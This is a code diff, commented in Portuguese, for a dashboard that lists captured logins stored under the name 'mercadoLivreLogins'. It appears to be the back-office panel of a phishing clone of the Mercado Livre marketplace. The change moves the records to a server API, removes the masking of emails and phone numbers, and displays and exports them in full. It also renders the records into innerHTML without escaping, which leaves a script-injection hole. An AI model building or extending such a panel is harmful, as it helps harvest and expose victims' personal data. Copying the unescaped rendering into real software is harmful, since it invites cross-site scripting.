@@ -121,12 +121,11 @@ body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-
         <table class="table" id="loginsTable" style="display:none;">
             <thead>
                 <tr>
-                    <th>ID</th>
-                    <th>Identificador</th>
-                    <th>Método</th>
-                    <th>Data/Hora</th>
-                    <th>User Agent</th>
-                    <th>IP</th>
+                    <th>ID</th> <!-- ✅ Coluna correta -->
+                    <th>Email</th> <!-- ✅ Coluna correta -->
+                    <th>Telefone</th> <!-- ✅ Coluna correta -->
+                    <th>Data/Hora</th> <!-- ✅ Coluna correta -->
+                    <th>User Agent</th> <!-- ✅ Coluna correta -->
                 </tr>
             </thead>
             <tbody id="loginsTableBody"></tbody>
@@ -155,28 +154,38 @@ class LoginDataViewer {
         setInterval(()=>this.loadData(false),30000);
     }
 
-    loadData(showLoading = true){
+    async loadData(showLoading = true){
         if(showLoading){
             document.getElementById('loadingState').style.display='flex';
             document.getElementById('loginsTable').style.display='none';
             document.getElementById('emptyState').style.display='none';
         }
 
-        const savedLogins = JSON.parse(localStorage.getItem('mercadoLivreLogins')||'[]');
-        this.logins = savedLogins;
-        this.filteredLogins = [...this.logins];
-        setTimeout(()=>{
+        try {
+            const response = await fetch('/api/logins'); // Busca dados do servidor
+            if (!response.ok) throw new Error('Falha ao buscar dados.');
+            
+            const savedLogins = await response.json();
+            this.logins = savedLogins;
+            this.filteredLogins = [...this.logins];
+
             document.getElementById('loadingState').style.display='none';
             if(this.logins.length===0){
                 document.getElementById('emptyState').style.display='block';
                 document.getElementById('loginsTable').style.display='none';
-            }else{
+            } else {
                 document.getElementById('emptyState').style.display='none';
                 document.getElementById('loginsTable').style.display='table';
                 this.renderTable();
             }
             this.updateStats();
-        },500);
+        } catch (error) {
+            console.error("Erro ao carregar dados:", error);
+            document.getElementById('loadingState').style.display = 'none';
+            document.getElementById('emptyState').querySelector('.empty-title').textContent = 'Erro ao carregar dados';
+            document.getElementById('emptyState').querySelector('.empty-text').textContent = 'Não foi possível conectar ao servidor. Verifique se ele está rodando.';
+            document.getElementById('emptyState').style.display = 'block';
+        }
     }
 
     renderTable(){
@@ -185,35 +194,25 @@ class LoginDataViewer {
         this.filteredLogins.forEach(login=>{
             const tr=document.createElement('tr');
             tr.innerHTML=`
-                <td>${login.id}</td>
-                <td class="identifier">${this.maskSensitiveData(login.email||login.phone)}</td>
-                <td><span class="method-badge method-${login.method.includes('google')?'google':login.method.includes('phone')?'phone':'email'}">${login.method}</span></td>
+                <td>${login.id}</td> 
+                <td class="identifier">${login.email}</td>
+                <td class="identifier">${login.phone}</td>
                 <td class="timestamp">${new Date(login.timestamp).toLocaleString()}</td>
                 <td>${login.userAgent}</td>
-                <td>${login.ip}</td>
             `;
             tbody.appendChild(tr);
         });
     }
 
-    maskSensitiveData(data){
-        if(!data) return '';
-        if(data.includes('@')){
-            const parts=data.split('@');
-            const name=parts[0];
-            const domain=parts[1];
-            const maskedName=name.length>2?name[0]+'*'.repeat(name.length-2)+name.slice(-1):name;
-            return maskedName+'@'+domain;
-        }else{
-            // telefone
-            return data.replace(/(\d{2})(\d{4,5})(\d{4})/,'($1) $2-$3');
-        }
-    }
+    // Removido maskSensitiveData, pois email e telefone são exibidos separadamente
+    // e a máscara pode ser aplicada no servidor se necessário para segurança.
+    // Para este exemplo, estamos exibindo os dados completos.
 
+    // Ajustado para filtrar por email ou telefone
     filterLogins(query){
         query=query.toLowerCase();
         this.filteredLogins=this.logins.filter(l=>{
-            return (l.email&&l.email.toLowerCase().includes(query))||(l.phone&&l.phone.includes(query))||(l.method&&l.method.toLowerCase().includes(query));
+            return (l.email && l.email.toLowerCase().includes(query)) || (l.phone && l.phone.includes(query));
         });
         this.renderTable();
     }
@@ -223,7 +222,7 @@ class LoginDataViewer {
         const today=new Date().toDateString();
         const todayCount=this.logins.filter(l=>new Date(l.timestamp).toDateString()===today).length;
         document.getElementById('todayLogins').textContent=todayCount;
-        const uniqueUsers=new Set(this.logins.map(l=>l.email||l.phone));
+        const uniqueUsers=new Set(this.logins.map(l=>l.email)); // Contar usuários únicos pelo email
         document.getElementById('uniqueUsers').textContent=uniqueUsers.size;
         if(this.logins.length>0){
             document.getElementById('lastLogin').textContent=new Date(this.logins[0].timestamp).toLocaleString();
@@ -234,10 +233,10 @@ class LoginDataViewer {
 
     exportData(){
         const csvRows=[
-            ['ID','Identificador','Método','Data/Hora','User Agent','IP']
+            ['ID','Email','Telefone','Data/Hora','User Agent'] // Cabeçalhos atualizados
         ];
         this.logins.forEach(l=>{
-            csvRows.push([l.id,l.email||l.phone,l.method,l.timestamp,l.userAgent,l.ip]);
+            csvRows.push([l.id,l.email,l.phone,l.timestamp,l.userAgent]); // Dados atualizados
         });
         const csvContent='data:text/csv;charset=utf-8,'+csvRows.map(e=>e.join(',')).join('\n');
         const encodedUri=encodeURI(csvContent);
@@ -249,10 +248,16 @@ class LoginDataViewer {
         document.body.removeChild(link);
     }
 
-    clearData(){
+    async clearData(){
         if(confirm('Tem certeza que deseja limpar todos os logins?')){
-            localStorage.removeItem('mercadoLivreLogins');
-            this.loadData();
+            try {
+                await fetch('/api/logins', { method: 'DELETE' }); // Envia requisição DELETE para o servidor
+                alert('Dados limpos com sucesso!');
+                this.loadData(); // Recarrega os dados após a limpeza
+            } catch (error) {
+                console.error('Erro ao limpar dados:', error);
+                alert('Falha ao limpar os dados no servidor.');
+            }
         }
     }
 }
